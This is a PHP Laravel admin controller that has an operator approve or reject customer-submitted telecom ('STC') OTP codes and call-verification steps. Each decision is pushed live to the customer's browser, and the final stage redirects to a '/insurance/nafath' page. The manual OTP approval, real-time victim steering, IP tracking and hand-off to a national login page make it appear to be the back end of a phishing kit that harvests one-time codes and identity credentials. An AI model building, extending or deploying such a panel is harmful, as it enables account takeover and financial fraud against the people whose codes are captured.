<?php

namespace App\Http\Controllers\Admin;

use App\Events\StcWaitingApproved;
use App\Events\StcWaitingRejected;
use App\Events\StcOtpApproved;
use App\Events\StcOtpRejected;
use App\Events\StcCallApproved;
use App\Events\StcCallRejected;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\AdminOtpActionRequest;
use App\Http\Requests\Admin\AdminOtpRejectRequest;
use App\Models\OtpCode;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Log;

class AdminStcController extends Controller
{
    use NotifiesDashboard;

    /**
     * Merge an STC flag into the customer's extra_data and update current_page.
     */
    private function setStcFlag(?\App\Models\CustomerProfile $customer, string $flag, string $currentPage, ?string $reason = null): void
    {
        if ($customer) {
            $extra = $customer->extra_data ?? [];
            $extra[$flag] = true;
            if ($reason !== null) {
                $extra[$flag . '_reason'] = $reason;
            }
            $customer->update(['current_page' => $currentPage, 'extra_data' => $extra]);
        }
    }

    /**
     * Shared approve logic for all 3 STC stages.
     */
    private function approveStage(AdminOtpActionRequest $request, string $eventClass, ?string $eventRedirect, string $flag, string $redirectPage, string $rebroadcastMsg, string $successMsg): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();
        $customer = $otp->customer;
        $customerIp = $customer?->ip_address ?? $request->customer_ip;
        $sessionId = $otp->session_id ?: $customer?->session_id;
        $event = new $eventClass($sessionId, $eventRedirect, $customer?->id);

        if ($otp->status !== 'pending') {
            if (in_array($otp->status, ['approved', 'verified'])) {
                try {
                    broadcast($event)->toOthers();
                } catch (\Throwable $e) {
                    Log::warning("Broadcast failed (re-broadcast {$flag}): " . $e->getMessage());
                }
                $this->setStcFlag($customer, $flag, $redirectPage);
                $this->flushCustomerCache();
                $this->notifyDashboard($customer ?? $customerIp, $flag);
                $this->refreshPaymentViewed($customer ?? $customerIp);
                return response()->json(['success' => true, 'message' => $rebroadcastMsg]);
            }
            return response()->json([
                'success' => false,
                'message' => 'هذا الطلب تم معالجته مسبقاً',
            ], 422);
        }

        $otp->verify();

        try {
            broadcast($event)->toOthers();
        } catch (\Throwable $e) {
            Log::warning("Broadcast failed ({$flag}): " . $e->getMessage());
        }

        $this->setStcFlag($customer, $flag, $redirectPage);
        $this->flushCustomerCache();
        $this->notifyDashboard($customer ?? $customerIp, $flag);
        $this->refreshPaymentViewed($customer ?? $customerIp);

        return response()->json(['success' => true, 'message' => $successMsg]);
    }

    /**
     * Shared reject logic for all 3 STC stages.
     */
    private function rejectStage(AdminOtpRejectRequest $request, string $eventClass, string $flag, string $successMsg): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();
        $customer = $otp->customer;
        $customerIp = $customer?->ip_address ?? $request->customer_ip;
        $sessionId = $otp->session_id ?: $customer?->session_id;
        $event = new $eventClass($sessionId, $request->input('reason'), $customer?->id);

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الطلب تم معالجته مسبقاً',
            ], 422);
        }

        $otp->reject($request->input('reason'));

        try {
            broadcast($event)->toOthers();
        } catch (\Throwable $e) {
            Log::warning("Broadcast failed ({$flag}): " . $e->getMessage());
        }

        $this->setStcFlag($customer, $flag, '/insurance/phone-verification', $request->input('reason'));
        $this->flushCustomerCache();
        $this->notifyDashboard($customer ?? $customerIp, $flag);
        $this->refreshPaymentViewed($customer ?? $customerIp);

        return response()->json(['success' => true, 'message' => $successMsg]);
    }

    // ─── Stage 1: STC Waiting ────────────────────────────────────

    public function approveWaiting(AdminOtpActionRequest $request): JsonResponse
    {
        return $this->approveStage(
            $request,
            StcWaitingApproved::class,
            null,
            'stc_waiting_approved',
            '/insurance/stc/otp',
            'تمت إعادة إرسال الموافقة على انتظار STC',
            'تمت الموافقة - تم توجيه العميل إلى صفحة رمز التحقق STC',
        );
    }

    public function rejectWaiting(AdminOtpRejectRequest $request): JsonResponse
    {
        return $this->rejectStage(
            $request,
            StcWaitingRejected::class,
            'stc_waiting_rejected',
            'تم رفض طلب التحقق STC',
        );
    }

    // ─── Stage 2: STC OTP ────────────────────────────────────────

    public function approveOtp(AdminOtpActionRequest $request): JsonResponse
    {
        return $this->approveStage(
            $request,
            StcOtpApproved::class,
            null,
            'stc_otp_approved',
            '/insurance/stc/call-waiting',
            'تمت إعادة إرسال الموافقة على رمز التحقق STC',
            'تمت الموافقة على رمز التحقق STC - تم توجيه العميل لانتظار المكالمة',
        );
    }

    public function rejectOtp(AdminOtpRejectRequest $request): JsonResponse
    {
        return $this->rejectStage(
            $request,
            StcOtpRejected::class,
            'stc_otp_rejected',
            'تم رفض رمز التحقق STC',
        );
    }

    // ─── Stage 3: STC Call ───────────────────────────────────────

    public function approveCall(AdminOtpActionRequest $request): JsonResponse
    {
        return $this->approveStage(
            $request,
            StcCallApproved::class,
            '/insurance/nafath',
            'stc_call_approved',
            '/insurance/nafath',
            'تمت إعادة إرسال الموافقة على مكالمة STC',
            'تمت الموافقة على مكالمة STC - تم توجيه العميل إلى صفحة النفاذ',
        );
    }

    public function rejectCall(AdminOtpRejectRequest $request): JsonResponse
    {
        return $this->rejectStage(
            $request,
            StcCallRejected::class,
            'stc_call_rejected',
            'تم رفض مكالمة التحقق STC',
        );
    }
}
